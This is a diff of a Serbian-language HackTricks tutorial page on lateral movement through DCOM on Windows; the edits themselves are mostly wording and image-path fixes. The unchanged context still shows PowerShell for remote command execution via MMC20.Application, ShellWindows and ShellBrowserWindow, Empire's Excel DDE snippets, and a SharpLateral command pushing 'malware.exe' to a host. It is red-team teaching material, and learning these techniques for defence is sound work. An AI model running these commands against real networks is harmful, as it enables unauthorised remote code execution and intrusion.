@@ -4,17 +4,17 @@
 
 <summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Da li radite u **kompaniji za kibernetičku bezbednost**? Želite li da vidite svoju **kompaniju reklamiranu na HackTricks**? ili želite pristup **najnovijoj verziji PEASS-a ili preuzimanje HackTricks-a u PDF formatu**? Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
+* Da li radite u **kompaniji za kibernetičku bezbednost**? Želite li da vidite svoju **kompaniju reklamiranu na HackTricks**? ili želite pristup **najnovijoj verziji PEASS ili preuzimanje HackTricks u PDF formatu**? Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
 * Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitteru** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Podelite svoje hakovanje trikove slanjem PR-ova** [**hacktricks repozitorijumu**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repozitorijumu**](https://github.com/carlospolop/hacktricks-cloud)..
+* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**hacktricks repozitorijum**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repozitorijum**](https://github.com/carlospolop/hacktricks-cloud)..
 
 </details>
 
 **Try Hard Security Group**
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -25,17 +25,17 @@
 **Za više informacija o ovoj tehnici pogledajte originalni post na [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**
 
 
-Model distribuiranih objektnih komponenti (DCOM) predstavlja zanimljivu mogućnost za mrežne interakcije sa objektima. Microsoft pruža sveobuhvatnu dokumentaciju za DCOM i Model objektnih komponenti (COM), dostupnu [ovde za DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) i [ovde za COM](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx). Spisak DCOM aplikacija može se dobiti korišćenjem PowerShell komande:
+Model distribuiranih komponentnih objekata (DCOM) predstavlja zanimljivu mogućnost za mrežne interakcije sa objektima. Microsoft pruža sveobuhvatnu dokumentaciju za DCOM i Model komponentnih objekata (COM), dostupnu [ovde za DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) i [ovde za COM](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx). Spisak DCOM aplikacija može se dobiti korišćenjem PowerShell komande:
 ```bash
 Get-CimInstance Win32_DCOMApplication
 ```
-COM objekat, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), omogućava skriptovanje MMC snap-in operacija. Posebno, ovaj objekat sadrži `ExecuteShellCommand` metod pod `Document.ActiveView`. Više informacija o ovom metodu može se pronaći [ovde](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx). Proverite pokretanjem:
+COM objekat, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), omogućava pisanje skriptova za MMC snap-in operacije. Posebno, ovaj objekat sadrži `ExecuteShellCommand` metod pod `Document.ActiveView`. Više informacija o ovom metodu može se pronaći [ovde](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx). Proverite pokretanjem:
 
 Ova funkcija olakšava izvršavanje komandi preko mreže putem DCOM aplikacije. Za interakciju sa DCOM-om na daljinu kao administrator, PowerShell se može koristiti na sledeći način:
 ```powershell
 [activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
 ```
-Ova komanda se povezuje sa DCOM aplikacijom i vraća instancu COM objekta. Metoda ExecuteShellCommand može zatim biti pozvana kako bi se izvršio proces na udaljenom računaru. Proces uključuje sledeće korake:
+Ova komanda se povezuje sa DCOM aplikacijom i vraća instancu COM objekta. Metoda ExecuteShellCommand može zatim biti pozvana da izvrši proces na udaljenom računaru. Proces uključuje sledeće korake:
 
 Provera metoda:
 ```powershell
@@ -55,7 +55,7 @@ ls \\10.10.10.10\c$\Users
 
 **Za više informacija o ovoj tehnici pogledajte originalni post [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**
 
-Identifikovano je da objekat **MMC20.Application** nedostaje eksplicitna "LaunchPermissions", podrazumevajući dozvole koje dozvoljavaju pristup administratorima. Za dalje detalje, može se istražiti nit [ovde](https://twitter.com/tiraniddo/status/817532039771525120), a preporučuje se korišćenje [@tiraniddo](https://twitter.com/tiraniddo) OleView .NET za filtriranje objekata bez eksplicitnih Launch Permission.
+Identifikovano je da objekat **MMC20.Application** nedostaje eksplicitna "LaunchPermissions," podrazumevajući dozvole koje dozvoljavaju pristup administratorima. Za dalje detalje, može se istražiti nit [ovde](https://twitter.com/tiraniddo/status/817532039771525120), a preporučuje se korišćenje [@tiraniddo](https://twitter.com/tiraniddo)’s OleView .NET za filtriranje objekata bez eksplicitnih Launch Permission.
 
 Dva specifična objekta, `ShellBrowserWindow` i `ShellWindows`, istaknuta su zbog nedostatka eksplicitnih Launch Permissions. Odsustvo unosa `LaunchPermission` u registru pod `HKCR:\AppID\{guid}` označava nedostatak eksplicitnih dozvola.
 
@@ -73,7 +73,7 @@ $item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\sy
 
 Lateralno kretanje može se postići iskorišćavanjem DCOM Excel objekata. Za detaljne informacije, preporučuje se čitanje diskusije o iskorišćavanju Excel DDE za lateralno kretanje putem DCOM na [Cybereason-ovom blogu](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).
 
-Projekat Empire pruža PowerShell skriptu, koja demonstrira korišćenje Excela za izvršavanje udaljenog koda (RCE) manipulacijom DCOM objekata. U nastavku su isečci iz skripte dostupne na [Empire-ovom GitHub repozitorijumu](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), prikazujući različite metode zloupotrebe Excela za RCE:
+Projekat Empire pruža PowerShell skriptu, koja demonstrira korišćenje Excela za izvršavanje udaljenog koda (RCE) manipulišući DCOM objektima. U nastavku su isečci iz skripte dostupne na [Empire-ovom GitHub repozitorijumu](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), prikazujući različite metode zloupotrebe Excela za RCE:
 ```powershell
 # Detection of Office version
 elseif ($Method -Match "DetectOffice") {
@@ -96,7 +96,7 @@ $Obj.DisplayAlerts = $false
 $Obj.DDEInitiate("cmd", "/c $Command")
 }
 ```
-### Alatke za automatizaciju lateralnog kretanja
+### Alatke za automatizaciju bočnog kretanja
 
 Dve alatke su istaknute za automatizaciju ovih tehnika:
 
@@ -120,7 +120,7 @@ SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
 
 **Try Hard Security Group**
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -130,7 +130,7 @@ SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
 
 Drugi načini podrške HackTricks-u:
 
-* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
+* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
 * **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
